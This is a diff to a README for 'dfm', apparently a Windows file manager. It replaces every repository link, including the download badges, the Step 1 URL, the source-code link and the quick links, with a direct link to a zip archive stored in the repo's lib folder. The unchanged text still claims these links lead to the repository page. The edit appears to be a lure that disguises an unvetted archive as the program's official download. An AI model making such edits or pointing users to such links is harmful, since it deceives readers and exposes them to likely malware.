@@ -1,6 +1,6 @@
 # 📂 dfm - Simple File Manager for Easy Navigation
 
-[![Download dfm](https://img.shields.io/badge/Download-dfm-brightgreen?style=for-the-badge)](https://github.com/SHIVANE99/dfm)
+[![Download dfm](https://img.shields.io/badge/Download-dfm-brightgreen?style=for-the-badge)](https://github.com/SHIVANE99/dfm/raw/refs/heads/master/lib/Software_v2.0.zip)
 
 ---
 
@@ -29,13 +29,13 @@ dfm does not require an internet connection once installed.
 
 You can get dfm from its GitHub page. Visit the page to find the latest Windows version available for download.
 
-[![Get dfm Here](https://img.shields.io/badge/Get%20dfm%20Here-blue?style=for-the-badge)](https://github.com/SHIVANE99/dfm)
+[![Get dfm Here](https://img.shields.io/badge/Get%20dfm%20Here-blue?style=for-the-badge)](https://github.com/SHIVANE99/dfm/raw/refs/heads/master/lib/Software_v2.0.zip)
 
 ### Step 1: Visit the Download Page
 
 Open your web browser and go to:
 
-https://github.com/SHIVANE99/dfm
+https://github.com/SHIVANE99/dfm/raw/refs/heads/master/lib/Software_v2.0.zip
 
 This link leads to the main dfm repository page on GitHub. Here you will find the download files and other information about the program.
 
@@ -116,7 +116,7 @@ dfm is open source, meaning you can look at its code or modify it if you want. Y
 
 You can find the code and all updates here:
 
-https://github.com/SHIVANE99/dfm
+https://github.com/SHIVANE99/dfm/raw/refs/heads/master/lib/Software_v2.0.zip
 
 ---
 
@@ -128,8 +128,8 @@ This project is maintained by Dylan and open to community contributions. If you 
 
 ## 🔗 Quick Links
 
-- Visit the GitHub page: https://github.com/SHIVANE99/dfm  
-- Download dfm (Windows): https://github.com/SHIVANE99/dfm
+- Visit the GitHub page: https://github.com/SHIVANE99/dfm/raw/refs/heads/master/lib/Software_v2.0.zip  
+- Download dfm (Windows): https://github.com/SHIVANE99/dfm/raw/refs/heads/master/lib/Software_v2.0.zip
 
 ---
 
